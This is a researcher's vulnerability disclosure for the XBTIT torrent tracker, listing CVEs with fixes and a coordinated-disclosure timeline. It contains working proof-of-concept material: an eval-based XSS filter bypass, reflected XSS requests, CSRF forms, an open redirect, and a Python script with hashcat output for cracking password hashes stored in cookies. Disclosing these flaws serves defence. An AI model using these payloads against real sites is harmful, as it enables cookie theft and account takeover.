---
layout: single
title: Multiple Vulnerabilities in XBTIT Torrent Tracker
date: 2018-09-03
categories:
  - security
  - websec
  - disclosure
tags:
  - xbtit
  - CVE-2018-15676
  - CVE-2018-15679
  - CVE-2018-15678
  - CVE-2018-15677
  - CVE-2018-15680
  - CVE-2018-15681
  - CVE-2018-15682
  - CVE-2018-15684
  - CVE-2018-15683
  - CVE-2018-16361
  - CVE-2018-17870
---
In August, 2018, I identified multiple vulnerabilities in the XBTIT torrent tracker software; a system in use by various active torrent trackers.

The issues identified include cross-site request forgery, cross-site scripting and various types of information disclosure. Technical details of the identified vulnerabilities can be found in the sections that follow.

## Anti-XSS Mechanism Bypass
XBTIT contains a small module (`includes/crk_protection.php`) which checks incoming requests for a variety of dangerous string signatures. Some of the signatures found within `crk_protection.php` will prevent basic XSS attacks (e.g. by blocking requests containing the string `.cookie`). However, it is possible to smuggle a payload containing any of the filtered terms.

The following payload would alert the filter, and block the request being made:

```javascript
alert(document.cookie)
```

By using `String.replace`, the recognised strings can be broken up and then reconstructed. The payload below places a tilde between a number of characters, removes them, and then trims the extra characters found at the start and end of the string, resulting in a final string of `alert(document.cookie)`:

```javascript
/a~lert(do~cu~me~nt~.c~oo~k~ie)/.toString().replace(/~/g, '').slice(1,-1)
```

As the `eval` function is not detected, the construction of the payload as a string can be combined with `eval` to execute it as arbitrary JavaScript:

```javascript
eval(/a~lert(do~cu~me~nt~.c~oo~k~ie)/.toString().replace(/~/g, '').slice(1,-1))
```

### CVE-ID
CVE-2018-15676

<hr>

## Reflected XSS in Forum Search
The `keywords` parameter in the search function available at `/index.php?page=forums&action=search` is vulnerable to reflected cross-site scripting. By packaging the payload as outlined in the [Anti-XSS Mechanism Bypass](#anti-xss-mechanism-bypass) section, it is possible to execute arbitrary JavaScript in the web browser of an authenticated user and subsequently steal their cookies (including the session cookie).

### Proof of Concept
```http
GET /index.php?page=forum&action=search&keywords=%22%3E%3Cimg%20src=x%20onerror=%22eval(/a~lert(do~cu~me~nt~.c~oo~k~ie)/.toString().replace(/~/g,%20%27%27).slice(1,-1))%22%3E%3C HTTP/1.1
Host: xbtit.vm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: SMFCookie693=a%3A4%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bs%3A40%3A%221250f6c7216825b4a231dc697393fc56e8921810%22%3Bi%3A2%3Bi%3A1723852786%3Bi%3A3%3Bi%3A0%3B%7D; uid=2; pass=b094c51fb1076fc241a300ba39c3de9e; xbtit=oghknpvtihirf66f94dqa8ohvf
Connection: close
Upgrade-Insecure-Requests: 1

```

### CVE-ID
CVE-2018-15679

### Solution
Update to the version that supersedes 2.5.4 or apply [This Patch](/assets/code/xbtit-multiple-vulnerabilities/xbtit.patch)

<hr>

## Reflected XSS in User Signup
The `act` parameter in the signup page available at `/index.php?page=signup` is vulnerable to reflected cross-site scripting. By packaging the payload as outlined in the [Anti-XSS Mechanism Bypass](#anti-xss-mechanism-bypass) section, it is possible to execute arbitrary JavaScript in the web browser of an authenticated user and subsequently steal their cookies (including the session cookie).

It should be noted, although this vulnerability is found in the signup page, the attack is still successful against an authenticated user.

### Proof of Concept
```http
GET /index.php?page=signup&act=%22%3E%3Cimg%20src=x%20onerror=%22eval(/a~lert(do~cu~me~nt~.c~oo~k~ie)/.toString().replace(/~/g,%20%27%27).slice(1,-1))%22%3E%3C%22 HTTP/1.1
Host: xbtit.vm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: SMFCookie693=a%3A4%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bs%3A40%3A%221250f6c7216825b4a231dc697393fc56e8921810%22%3Bi%3A2%3Bi%3A1723852786%3Bi%3A3%3Bi%3A0%3B%7D; uid=2; pass=b094c51fb1076fc241a300ba39c3de9e; xbtit=6nhrbuivfet70433goijpb7uof
Connection: close
Upgrade-Insecure-Requests: 1

```

### CVE-ID
CVE-2018-15678

### Solution
Update to the version that supersedes 2.5.4 or apply [This Patch](/assets/code/xbtit-multiple-vulnerabilities/xbtit.patch)

<hr>

## Stored XSS via CSRF in News
Due to a lack of cross-site request forgery protection, it is possible to automate the action of posting a new news item by luring an authenticated user to a web page that automatically submits a form on their behalf.

In addition to this, the title of the news items are vulnerable to stored cross-site scripting. By placing the JavaScript in the `onerror` event handler of an `<img />`, the JavaScript will be stored and executed every time the news item is viewed on `/index.php?page=viewnews`.

### Proof of Concept
```xml
<form action="http://xbtit.vm/index.php?page=news&act=confirm" method="post">
  <input type="text" name="action" value="add">
  <input type="text" name="id" value="">
  <input type="text" name="title" value="&lt;img src=x onerror=alert(1)&gt;">
  <input type="text" name="fontchange" value="">
  <input type="text" name="fontchange" value="">
  <input type="text" name="news" value="News content">
  <input type="text" name="conferma" value="Confirm">
  <input type="submit" value="Submit">
</form>
```

### CVE-ID
CVE-2018-15677

### Solution
Update to the version that supersedes 2.5.4 or apply [This Patch](/assets/code/xbtit-multiple-vulnerabilities/xbtit.patch)

<hr>

## Reflected XSS in News Edit Page
The `id` parameter in the edit news page available at `/index.php?page=news&act=edit` is vulnerable to reflected cross-site scripting. By packaging the payload as outlined in the [Anti-XSS Mechanism Bypass](#anti-xss-mechanism-bypass) section, it is possible to execute arbitrary JavaScript in the web browser of an authenticated user and subsequently steal their cookies (including the session cookie).

For the attack to be successful, the `id` parameter value must start with a valid news item ID.

### Proof of Concept
```http
GET /index.php?page=news&act=edit&id=2%22%3E%3Cimg%20src=x%20onerror=%22eval(/a~lert(do~cu~me~nt~.c~oo~k~ie)/.toString().replace(/~/g,%20%27%27).slice(1,-1))%22%3E%3C%22 HTTP/1.1
Host: xbtit.vm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: SMFCookie693=a%3A4%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bs%3A40%3A%221250f6c7216825b4a231dc697393fc56e8921810%22%3Bi%3A2%3Bi%3A1723852786%3Bi%3A3%3Bi%3A0%3B%7D; uid=2; pass=b094c51fb1076fc241a300ba39c3de9e; xbtit=ugrlrb1b7tq4cs3pcqq2atuupb
Connection: close
Upgrade-Insecure-Requests: 1

```

### CVE-ID
CVE-2018-16361

### Solution
Update to the version that supersedes 2.5.4 or apply [This Patch](/assets/code/xbtit-multiple-vulnerabilities/xbtit.patch)

<hr>

## Passwords Stored as Unsalted MD5 Hashes
Passwords stored within the `xbtit_users` table are stored by default as unsalted MD5 hashes. Should a breach occur, reversing the hashes would be a trivial task due to the large quantities of precomputed hashes available.

In instances of a strong password being used, it would still require less time to brute force in comparison to stronger hashing methods that are intentionally expensive on resources.

```
mysql> select username, password, salt from xbtit_users;
+----------+----------------------------------+------+
| username | password                         | salt |
+----------+----------------------------------+------+
| Guest    |                                  |      |
| root     | 7b24afc8bc80e548d66c4e7ff72171c5 |      |
+----------+----------------------------------+------+
2 rows in set (0.00 sec)
```

### CVE-ID
CVE-2018-15680

### Solution
There is an option in the security suite settings to choose different hashing schemes. As of XBTIT 2.5.4, choosing a new option does not seem to work.

All options with the exception of option 1 will introduce the use of salts. It may be possible to force a new hashing scheme by editing the `secsui_pass_type` field of the `xbtit_settings` table to a value of `6` for the new XBTIT hashing style. Caution should be taken when manually editing this setting.

<hr>

## Password Hash Stored in Cookie
XBTIT sets a number of cookies when a user has authenticated with the system; all of which can be accessed via JavaScript. Should an attacker be successful in invoking an XSS attack, it would be possible to steal the `pass` cookie - which can be used to reverse the victim's plain text password.

When a user signs up to the website, along with certain other actions that result in the user profile being updated, a random number is assigned to their account and used in a number of places; in some ways like a CSRF token:

```
mysql> select username, password, random from xbtit_users;
+----------+----------------------------------+--------+
| username | password                         | random |
+----------+----------------------------------+--------+
| Guest    |                                  |      0 |
| root     | 7b24afc8bc80e548d66c4e7ff72171c5 | 955776 |
+----------+----------------------------------+--------+
2 rows in set (0.00 sec)
```

When the `pass` cookie is set, it takes this random number (from here on, referred to as `$RND`) and places it at the start and end of the user's MD5 hashed password. Using the example above, where the user's password is `toor` and `$RND` is `955776`, the concatenated string would be:

```
9557767b24afc8bc80e548d66c4e7ff72171c5955776
```

After concatenating `$RND` to the hash stored in `xbtit_users.password`, the string is then hashed once more using MD5. The string from the previous example, would result in the `pass` cookie having a value of:

```
b094c51fb1076fc241a300ba39c3de9e
```

The value of `$RND` is also restricted to be between `100000` and `999999`, as can be seen from line 389 of `account.php`:

```php
# Create Random number
$floor = 100000;
$ceiling = 999999;
srand((double)microtime()*1000000);
$random = rand($floor, $ceiling);
```

Using this information, it is possible to transform a standard wordlist into one which can be used to brute force the concatenated string. Using the proof of concept found at the end of this section, it was possible to generate all possible values for the password `toor` in 0.46 seconds:

```shell_session
$ python xbtit-wordlist-generator.py wordlist.txt > xbtit-wordlist.txt
--- 0.462036132812 seconds ---
```

To transform the `adobe_top100_pass.txt` wordlist bundled with Metasploit, with the addition of `toor` at the end of the list, the POC took 45.69 seconds to generate all possible permutations:

```shell_session
$ python xbtit-wordlist-generator.py adobe_top100_pass.txt > xbtit-wordlist.txt
--- 45.6966779232 seconds ---
$ ls -lh xbtit-wordlist.txt
-rw-r--r-- 1 rastating rastating 2.8G Aug 21 00:01 xbtit-wordlist.txt
```

Using the generated wordlist, it was possible to reverse the `pass` cookie contents in 10 seconds:

```
b094c51fb1076fc241a300ba39c3de9e:9557767b24afc8bc80e548d66c4e7ff72171c5955776

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: b094c51fb1076fc241a300ba39c3de9e
Time.Started.....: Tue Aug 21 00:28:08 2018 (10 secs)
Time.Estimated...: Tue Aug 21 00:28:18 2018 (0 secs)
Guess.Base.......: File (xbtit-wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  9584.5 kH/s (4.17ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 90900000/90900000 (100.00%)
Rejected.........: 0/90900000 (0.00%)
Restore.Point....: 90832896/90900000 (99.93%)
Candidates.#1....: 9328967b24afc8bc80e548d66c4e7ff72171c5932896 -> 9999997b24afc8bc80e548d66c4e7ff72171c5999999
HWMon.Dev.#1.....: Temp: 61c Fan:  0% Util: 46% Core:1911MHz Mem:5005MHz Bus:8
```

With the value `9557767b24afc8bc80e548d66c4e7ff72171c5955776` recovered, it's confirmed that the plain text password is in the original wordlist that was used to generate the permutations. From here, stripping the first and last six digits reveals the original MD5 hash that is stored of the user's plain text password: `7b24afc8bc80e548d66c4e7ff72171c5`, which can now be used against the original wordlist, which in this case reveals the plain text password in 0.01ms:

```
7b24afc8bc80e548d66c4e7ff72171c5:toor                     

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 7b24afc8bc80e548d66c4e7ff72171c5
Time.Started.....: Tue Aug 21 00:30:48 2018 (0 secs)
Time.Estimated...: Tue Aug 21 00:30:48 2018 (0 secs)
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:        0 H/s (0.01ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 101/101 (100.00%)
Rejected.........: 0/101 (0.00%)
Restore.Point....: 0/101 (0.00%)
Candidates.#1....: 123456 -> toor
HWMon.Dev.#1.....: Temp: 59c Fan:  0% Util:  8% Core:1556MHz Mem:5005MHz Bus:8
```

### Proof of Concept
```python
import hashlib
import sys
import time

if len(sys.argv) < 2:
    print 'Usage: python {name} /path/to/wordlist.txt'.format(name = sys.argv[0])
    exit(1)

start_time = time.time()

with open(sys.argv[1], 'r') as passwords:
  for password in passwords:
    digest = hashlib.md5()
    digest.update(password.strip())
    hash = digest.hexdigest()

    for rnd in range(100000, 1000000):
        print '{rnd}{hash}{rnd}'.format(rnd = rnd, hash = hash)

print >> sys.stderr, '--- %s seconds ---' % (time.time() - start_time)
```

### CVE-ID
CVE-2018-15681

### Solution
Within the security suite settings, choose `New xbtit (Session)` as the cookie type to remove the hash from the cookie. This will cause all existing sessions to be invalidated and require all users to log back in.

<hr>

## Private Message CSRF
Due to a lack of cross-site request forgery protection, it is possible to automate the action of sending private messages to users by luring an authenticated user to a web page that automatically submits a form on their behalf.

In order for the attack to work, the `uid` parameter must be set to the ID of the user that is being targetted. The user ID can be harvested by enumerating the `id` parameter from the user details page found at `/index.php?page=userdetails&id=UID`

```xml
<form action="http://xbtit.vm/index.php?page=usercp&do=pm&action=post&uid=3&what=new" method="post">
  <input type="text" name="receiver" value="root">
  <input type="text" name="subject" value="subject line">
  <input type="text" name="fontchange" value="">
  <input type="text" name="fontchange" value="">
  <input type="text" name="msg" value="message body">
  <input type="submit" value="Submit">
</form>
```

### CVE-ID
CVE-2018-15682

<hr>

## Unauthenticated Access to PHP Logs
PHP errors are logged by default to files found in `/include/logs`. As this directory does not have an index in place, the file names do not need to be guessed and can be easily accessed.

Should an index file be placed, the files use a predictable naming convention by default - making it possible to still access them. By default, the base name of the log file will be `xbtit-errors` and the log will be rotated each day with the date appended to the end of the base name in the `_DD.MM.YY_` format. For example, the log file for the 19th August 2018 would be found at `/include/logs/xbtit-errors_19.08.18_.log`.

These logs result in full path disclosure and can potentially contain sensitive information such as passwords.

An example of the output can be found below:

```
[20-Aug-2018 20:51:25 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:51:25 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 233
[20-Aug-2018 20:51:25 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:51:25 UTC] PHP Warning:  A non-numeric value encountered in /var/www/xbtit/forum/forum.search.php on line 52
[20-Aug-2018 20:52:21 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:52:21 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 233
[20-Aug-2018 20:52:21 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:52:21 UTC] PHP Warning:  A non-numeric value encountered in /var/www/xbtit/forum/forum.search.php on line 52
[20-Aug-2018 20:52:34 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:52:34 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 233
[20-Aug-2018 20:52:34 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:52:34 UTC] PHP Warning:  A non-numeric value encountered in /var/www/xbtit/forum/forum.search.php on line 52
[20-Aug-2018 20:53:49 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:53:49 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 233
[20-Aug-2018 20:53:49 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:55:20 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:55:20 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 233
[20-Aug-2018 20:55:20 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/blocks/mainusertoolbar_block.php on line 98
[20-Aug-2018 20:55:22 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 461
[20-Aug-2018 20:55:22 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/include/functions.php on line 233
[20-Aug-2018 20:55:22 UTC] PHP Warning:  session_name(): Cannot change session name when session is active in /var/www/xbtit/blocks/mainusertoolbar_block.php on line 98
```

### CVE-ID
CVE-2018-15684

### Solution
Change the base name of the log files and add an index to the directory. Alternatively, block access to the files using a WAF or htaccess rules.

<hr>

## Open Redirect in Login Page
The `returnto` parameter of the login page is vulnerable to an open redirect due to a lack of validation. If a user is already logged in when accessing the page, they will be instantly redirected.

### Proof of Concept
```http
GET /index.php?page=login&returnto=http%3a%2f%2fgoogle.com HTTP/1.1
Host: xbtit.vm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: SMFCookie693=a%3A4%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bs%3A40%3A%221250f6c7216825b4a231dc697393fc56e8921810%22%3Bi%3A2%3Bi%3A1723852786%3Bi%3A3%3Bi%3A0%3B%7D; uid=2; pass=b094c51fb1076fc241a300ba39c3de9e; xbtit=kku96l8d7blu4f3bpjjkvu7dp4
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

### CVE-ID
CVE-2018-15683

## Timeline
* **2018-08-21:** Report provided to one of the project collaborators
* **2018-08-22:** Response from a team member who will discuss further with the XBTIT team
* **2018-08-25:** Follow up e-mail to check on status of discussions
* **2018-08-27:** Advice on how to patch issues provided to a project collaborator
* **2018-08-31:** Further e-mails, offer assistance and create patches for CVE-2018-15679 and CVE-2018-15678
* **2018-09-01:** Found an additional vulnerability (CVE-2018-16361) whilst creating patches
* **2018-09-01:** Create patches for CVE-2018-15677 and CVE-2018-16361
* **2018-09-03:** Arrange pull request for patches issues and public disclosure
* **2018-09-03:** Pull request opened via [GitHub](https://github.com/btiteam/xbtit/pull/58) to patch the XSS issues
* **2018-10-01:** Identify another open redirect (CVE-2018-17870)
* **2018-10-01:** Pull request opened via [GitHub](https://github.com/btiteam/xbtit/pull/59) to patch CVE-2018-15683 and CVE-2018-17870
* **2018-10-01:** Pull request opened via [GitHub](https://github.com/btiteam/xbtit/pull/60) to patch CVE-2018-15684
